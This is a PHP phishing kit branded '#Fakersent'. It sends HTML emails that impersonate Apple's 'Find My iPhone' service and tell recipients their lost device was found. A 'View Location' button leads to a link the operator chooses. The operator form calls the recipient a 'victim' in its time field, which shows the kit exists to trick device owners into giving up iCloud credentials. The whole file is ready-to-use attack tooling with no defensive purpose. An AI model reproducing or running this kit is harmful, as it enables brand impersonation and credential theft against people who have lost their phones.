<?php include ("email_config.php");
if (isset($_POST['email']) && !empty($_POST['email'])) {
    $email = $_POST['email'];
    $device = $_POST['device'];
    $time = $_POST['time'];
    $url = $_POST['url'];
    $address = $_POST['address'];
    if (isset($_POST["send"])) {
        $emailto = $_POST['emailto'];
        $subject = $_POST['subject'];
        $inhalt = $_POST['inhalt'];
        $sender = $_POST['sender'];
    }
    require 'class.phpmailer.php';
    include ('class.smtp.php');
    $mail = new PHPMailer;
    $mail->IsSMTP();
    $mail->SMTPSecure = 'ssl';
    $mail->SMTPAuth = true;
    $mail->Host = HOST;
    $mail->Port = PORT;
    $mail->Username = EMAIL;
    $mail->Password = PASSWORD;
    $mail->From = EMAIL;
    $mail->FromName = 'Find My iPhone';
    $mail->AddAddress($_POST['email']);
    $mail->IsHTML(true);
    $mail->Subject = $device . ' has been found';
    $mail->Body = '<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=SHIFT_JIS">
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<script>
var SC_benchmarkPreloadEvents={headStart:new Date().getTime()};
</script>
<title>iCloud</title>
</head>
<body class="apple-theme-v4 sc-focus">

<div>
  <table class="" style="font-family: Helvetica Neue, Helvetica, sans-serif; font-size: inherit; line-height: inherit; text-align: center; border-spacing: 0px; border-collapse: collapse; padding: 0px; border: 0px none;" align="center" cellpadding="0" cellspacing="0">
    <tbody>
     
      <tr>
        <td style="width: 64px;">&nbsp;</td>
        <td style="width: 685px;"><table class="" style="font-size: inherit; line-height: inherit; padding: 0px; border: 0px none;" align="center">
            <tbody>
              <tr>
                <td align="center"><table class="" align="center" border="0" cellpadding="0" cellspacing="0">
                    <tbody>
                      <tr>
                        <td colspan="3" style="width: 184px; height: 14px; font-size: 0px; margin: auto;" align="center" height="14" width="184"><img src="http://i.imgur.com/YJLLjDY.png" alt="" height="14" width="184"></td>
                      </tr>
                      <tr>
                        <td style="margin: auto;"><table class="" style="width: 184px; height: 160px; margin: auto;"
align="center" cellpadding="0" cellspacing="0">
                            <tbody>
                              <tr>
                                <td colspan="3" style="vertical-align: top; width: 14px; height: 160px; margin: auto;" align="center" height="160" width="14"><img src="http://i.imgur.com/jAo1o7x.png" alt="" style="display: block;" height="160" width="14"></td>
                                <td colspan="3" style="vertical-align: top; width: 160px; height: 160px; margin: auto;" align="center" height="160" width="160"><img src="http://i.imgur.com/KPegnpa.png" style="display: block; border: 0px none;" border="0" height="160" width="160"></td>
                                <td colspan="3" style="vertical-align: top; width: 14px; height: 160px; margin: auto;" align="center" height="160" width="14"><img
src="http://i.imgur.com/z76FUyA.png" alt="" style="display: block;" height="160" width="14"></td>
                              </tr>
                            </tbody>
                          </table></td>
                      </tr>
                      <tr>
                        <td colspan="3" style="vertical-align: top; width: 184px; height: 14px; margin: auto;" align="center" height="14" width="184"><img src="http://i.imgur.com/Dp8vhCt.png" alt="" style="display: block;" height="14" width="184"></td>
                      </tr>
                    </tbody>
                  </table></td>
              </tr>
              <tr>
                <td style="color: rgb(43, 43, 43); font-size: 20px; padding: 19px 0px 16px;" align="center">' . $device . ' was found near ' . $address . ' at ' . $time . '</td>
              </tr>
              <tr>
                <td style="color: rgb(102, 102, 102); line-height: 20px; padding-bottom: 6px;" align="center">Your ' . $device . ' last reported location will be available for 24 hours.</td>
              </tr>
            </tbody>
          </table></td>
        <td style="width: 64px;">&nbsp;</td>
      </tr>
      <tr>
        <td colspan="3" style="width: 685px; padding: 13px 0px;" align="center"><table style="font-size: inherit; line-height: inherit; padding: 0px; border: 0px none;" align="center" cellpadding="0" cellspacing="0" height="43">
            <tbody>
              <tr>
                <td class="" style="background-repeat: no-repeat;" background="http://i.imgur.com/5dj6Cr1.png" width="10"></td>
                <td class="" style="text-align: center; color: rgb(43,
43, 43); text-shadow: rgb(253, 253, 253) 0px 1px 0px; padding: 0px 6px; background-color: rgb(239, 239, 239); background-repeat: repeat-x;" align="center" background="http://i.imgur.com/3h3Vw9q.png" bgcolor="#efefef" height="43"><a class=""href="' . $url . '" style="color: rgb(43, 43, 43); text-decoration: none;">View Location</a></td>
                <td class="" style="background-repeat: no-repeat;" background="https://statici.icloud.com/emailimages/v4/common/new/btn_more_right.png" width="30"><br></td>
              </tr>
            </tbody>
          </table></td>
      </tr>
      
      <tr>
        <td id="footerGroup1" colspan="3" style="width: 685px; font-size: 11px; line-height: 22px; color: rgb(136, 136, 136); padding: 15px 0px 10px; background-repeat: no-repeat;" align="center"><br>
          <table class="" style="font-size: inherit; line-height: inherit; text-align: center; border-spacing: 0px; border-collapse: collapse; padding: 0px; border: 0px none;" align="center"
cellpadding="0" cellspacing="0">
            <tbody>
              <tr>
                <td class="" id="footerGroup1" colspan="3" style="width: 685px; color: rgb(136, 136, 136); padding: 15px 0px 10px; background-repeat: no-repeat;" align="center" background="http://i.imgur.com/wN2eqSO.png"><img src="http://i.imgur.com/AZiBtdZ.png" class="" style="display: inline-block; width: 81px; height: 22px;" height="22" width="81"></td>
              </tr>
              <tr>
                <td class="" colspan="3" style="width: 685px; line-height: 14px; color: rgb(136, 136, 136);" align="center"><span class="">iCloud is a service of Apple.&nbsp;</span><span class="" style="white-space: nowrap;"><a href="https://appleid.apple.com/choose-your-country/" style="color: rgb(0, 136, 204); text-decoration: none;">My Apple ID&nbsp;</a></span>|&nbsp;<span class="" style="white-space: nowrap;"><a href="http://www.apple.com/support/icloud/ww" style="color: rgb(0, 136, 204); text-decoration:
none;">Support&nbsp;</a></span>|&nbsp;<span class="" style="white-space: nowrap;"><a href="http://www.apple.com/legal/internet-services/icloud/ww/" style="color: rgb(0, 136, 204); text-decoration: none;">Terms &amp; Conditions&nbsp;</a></span>|&nbsp;<span class="" style="white-space: nowrap;"><a href="http://www.apple.com/legal/internet-services/privacy/" style="color: rgb(0, 136, 204); text-decoration: none;">Privacy Policy&nbsp;</a></span><br>
                  <span class=""><span class="" style="white-space: nowrap;">Copyright (C) 2016&nbsp;&nbsp;</span>Apple Inc.&nbsp;<span class=""><a href="https://www.icloud.com/applications/mail/current/es-es/index.html#address" id="address" style="color: rgb(136, 136, 136); text-decoration: none;">1 Infinite Loop, Cupertino, CA 95014, United States.</a></span>&nbsp;<span class="" style="white-space: nowrap;">All rights reserved.</span></span></td>
              </tr>
            </tbody>
          </table></td>
      </tr>
      
    </tbody>
  </table>
</div>
</body>
</html>
';
    $mail->AltBody = "To view the message, please use an HTML compatible email viewer!";
    if (!$mail->Send()) {
        echo 'Message could not be sent.';
        echo 'Mailer Error: ' . $mail->ErrorInfo;
        exit;
    }
    echo 'Mail has been sent Successfully to: <b>' . $email . '</b>';
}
$key = md5(uniqid(microtime(), true));
$session = md5(uniqid(findmyiphone - icloud . com, true));;
echo '
<!DOCTYPE HTML>
<html>
<link rel="shortcut icon" href="http://fakersent.com/favicon.png"><center>
<title>#Fakersent</title>
<font size="6" color="black">#Fakersent</font>
</center>
<body>

<form action="" method="post">
<table width=600 align=center cellpadding="5" >
<tr>
                                
				<td><b><font size="2">Email:</font></b> <font color="#808080" size="2">Email of person</font></td>
				<td><font size="3">
	<input type="text" name="email" size="50" value="" required ><br>
				</font></td>
			</tr>
			<tr>
				<td><b><font size="2">Location Address (optional):</font></b> <font color="#808080" size="2">iDevice Found Location</font></td>
				<td><font size="3">
	<input type="text" name="address" size="50" ><br>
				</font></td>
			</tr>
			<tr>
				<td><b><font size="2">Time of email:</font></b> <font color="#808080" size="2">Time of Victim Country</font></td>
				<td><font size="3">
	<input type="text" name="time" size="50" value="';
echo date("g:i A");;
echo '" required><br>
				</font></td>
			</tr>
			<tr>
				<td><b><font size="2">URL Address:</font></b> <font color="#808080">Address of the website</font></td>
				<td><font size="3">
	<input type="text" name="url" size="50" required value="';
echo LINK;;
echo '"></font><font size="2"><br>
				</font></td>
			</tr>
			<tr>
				<td><b><font size="2">Device: </font></b> <font size="2" color="#808080">iPhone, iPad or iPod.</font></td>
				<td><font size="3">
	<input type="text" name="device" size="50" value="iPhone" required ><br>
				</font></td>
			</tr>
			<tr>
				<td colspan="2" align=center><input type="submit" value="Send Mail" ></td>
			</tr>
                              

</table>
</form>
</body>
</html>

';
